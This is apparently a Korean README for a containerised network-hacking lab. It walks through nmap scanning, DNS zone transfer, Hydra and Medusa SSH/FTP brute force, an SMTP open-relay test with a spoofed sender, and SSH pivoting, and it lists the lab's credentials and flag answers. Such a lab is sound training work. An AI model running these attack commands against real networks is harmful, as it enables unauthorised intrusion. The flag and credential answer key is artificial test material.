# 네트워크 해킹 랩 (03_network_lab)

이 랩은 실제 기업 네트워크 환경을 시뮬레이션합니다.
네트워크 스캔, 취약한 서비스 공격, 크리덴셜 브루트포스, DNS 정보 수집, 피벗까지
실전 네트워크 침투 테스트 절차를 단계별로 실습합니다.

---

## 네트워크 구성

```
[공격자 컨테이너]
172.20.0.100 (attacker)
       |
       | corp_net (172.20.0.0/16)
       |
  ┌────┴────────────────────────────────┐
  │                                      │
172.20.1.10         172.20.1.20          │
(victim-linux)      (victim-ftp)         │
SSH:22              FTP:21               │
root:toor           anonymous, ftp123    │
employee:employee123                     │
                                         │
172.20.1.30         172.20.1.40          │
(dns-server)        (mail-server)        │
DNS:53              SMTP:25              │
Zone Transfer 허용  Open Relay 허용      │
  └────────────────────────────────────┘
```

---

## 빠른 시작

```bash
cd labs/03_network_lab
docker compose up -d

# 공격자 컨테이너에 접속
docker exec -it net_lab_attacker bash
```

---

## 실습 시나리오

### 시나리오 1: 네트워크 정찰

#### 1.1 호스트 발견 (Host Discovery)
```bash
# 공격자 컨테이너 내부에서 실행

# 핑 스윕
nmap -sn 172.20.0.0/16

# 빠른 포트 스캔
nmap -T4 -F 172.20.1.0/24

# 상세 서비스 버전 탐지
nmap -sV -sC -p- 172.20.1.0/24 -oA /tmp/network_scan
```

#### 1.2 서비스 핑거프린팅
```bash
# SSH 버전 확인
nmap -sV -p 22 172.20.1.10

# 모든 포트 상세 스캔
nmap -A -p 21,22,23,25,53,80 172.20.1.0/24

# OS 탐지
nmap -O 172.20.1.10
```

---

### 시나리오 2: DNS 정보 수집

#### 2.1 DNS 조회
```bash
# 기본 조회
dig @172.20.1.30 corp.local ANY

# 특정 레코드 유형 조회
dig @172.20.1.30 corp.local MX
dig @172.20.1.30 corp.local TXT
dig @172.20.1.30 corp.local NS
```

#### 2.2 Zone Transfer (AXFR) — 핵심 실습
```bash
# Zone Transfer 시도
dig @172.20.1.30 corp.local AXFR

# 성공 시 모든 내부 호스트 정보 노출
# → 서버 IP, 내부망 구조, TXT 레코드의 민감 정보 확인

# dnsrecon으로 자동화
dnsrecon -d corp.local -t axfr -n 172.20.1.30

# dnsenum 사용
dnsenum --dnsserver 172.20.1.30 corp.local
```

**예상 결과**: `secret.corp.local` TXT 레코드에서 관리자 패스워드 노출

---

### 시나리오 3: SSH 크리덴셜 공격

#### 3.1 기본 크리덴셜 시도
```bash
ssh employee@172.20.1.10
# 패스워드: employee123
```

#### 3.2 Hydra 브루트포스
```bash
# 단일 사용자 브루트포스
hydra -l employee -P /usr/share/wordlists/rockyou.txt \
    172.20.1.10 ssh

# 사용자명 목록 공격
hydra -L /tmp/users.txt -P /tmp/pass.txt \
    172.20.1.10 ssh -t 4

# root 계정 직접 공격
hydra -l root -P /tmp/top100.txt \
    172.20.1.10 ssh -V
```

**wordlist 생성**:
```bash
cat > /tmp/users.txt << 'EOF'
admin
root
employee
user
test
EOF

cat > /tmp/pass.txt << 'EOF'
password
123456
employee123
admin123
toor
qwerty
EOF
```

#### 3.3 Medusa 브루트포스
```bash
medusa -h 172.20.1.10 -u root -P /tmp/pass.txt -M ssh
```

---

### 시나리오 4: FTP 취약점 공격

#### 4.1 익명 FTP 접근
```bash
ftp 172.20.1.20

# 연결 후
Name: anonymous
Password: (빈칸 또는 이메일)
ftp> ls
ftp> cd public
ftp> get flag.txt
ftp> get config.txt
ftp> bye
```

#### 4.2 크리덴셜 기반 접근
```bash
# Hydra로 FTP 브루트포스
hydra -l ftpuser -P /tmp/pass.txt \
    ftp://172.20.1.20

# 접속
ftp ftpuser@172.20.1.20
# 패스워드: ftp123
```

#### 4.3 Telnet 접근
```bash
telnet 172.20.1.20 23
```

---

### 시나리오 5: SMTP 오픈 릴레이 테스트

```bash
# SMTP 수동 테스트
telnet 172.20.1.40 25

EHLO attacker.com
MAIL FROM: <fake@external.com>
RCPT TO: <victim@anywhere.com>
DATA
Subject: Phishing Test

테스트 메일입니다.
.
QUIT
```

```bash
# swaks로 자동 테스트
swaks --to victim@example.com \
      --from fake@external.com \
      --server 172.20.1.40 \
      --body "Open relay test"
```

---

### 시나리오 6: 피벗 (Pivoting)

SSH 접근 후 내부망 탐색:

```bash
# 피해자 리눅스에 SSH 접속 후
ssh root@172.20.1.10

# 내부 네트워크 추가 탐색
ip route
arp -a
cat /etc/hosts

# SSH 터널링으로 내부망 접근
# 공격자 로컬에서:
ssh -L 8888:172.20.2.10:80 root@172.20.1.10
# → localhost:8888 접속 시 172.20.2.10:80으로 연결
```

---

## 주요 nmap 명령어 레퍼런스

```bash
# 스텔스 스캔 (SYN)
nmap -sS 172.20.1.0/24

# UDP 스캔 (DNS, SNMP 등)
nmap -sU -p 53,161,123 172.20.1.0/24

# 취약점 스크립트
nmap --script vuln 172.20.1.10
nmap --script ssh-brute 172.20.1.10
nmap --script ftp-anon 172.20.1.20
nmap --script smtp-open-relay 172.20.1.40
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=corp.local 172.20.1.30

# 결과 저장
nmap -sV -oX /tmp/scan.xml 172.20.1.0/24
nmap -sV -oN /tmp/scan.txt 172.20.1.0/24
nmap -sV -oG /tmp/scan.gnmap 172.20.1.0/24
```

---

## 서비스별 크리덴셜 정리

| 서비스 | 호스트 | 계정 | 패스워드 |
|--------|--------|------|---------|
| SSH | 172.20.1.10 | root | toor |
| SSH | 172.20.1.10 | employee | employee123 |
| FTP | 172.20.1.20 | anonymous | (없음) |
| FTP | 172.20.1.20 | ftpuser | ftp123 |
| Telnet | 172.20.1.20 | (없음) | (없음) |

---

## 플래그 위치

| 플래그 | 위치 | 획득 방법 |
|--------|------|----------|
| FLAG{ssh_w34k_p4ssw0rd_r00t} | 172.20.1.10:/root/flag.txt | SSH root 접근 |
| FLAG{ftp_4n0nym0us_4cc3ss} | 172.20.1.20:/home/ftpuser/public/flag.txt | 익명 FTP |
| admin 패스워드 | DNS TXT 레코드 | Zone Transfer |

---

## 트러블슈팅

```bash
# DNS 서버 시작 실패 시 로그 확인
docker compose logs dns-server

# 공격자 컨테이너 도구 설치 확인
docker exec net_lab_attacker which nmap hydra

# 네트워크 연결 확인
docker exec net_lab_attacker ping -c 3 172.20.1.10
```
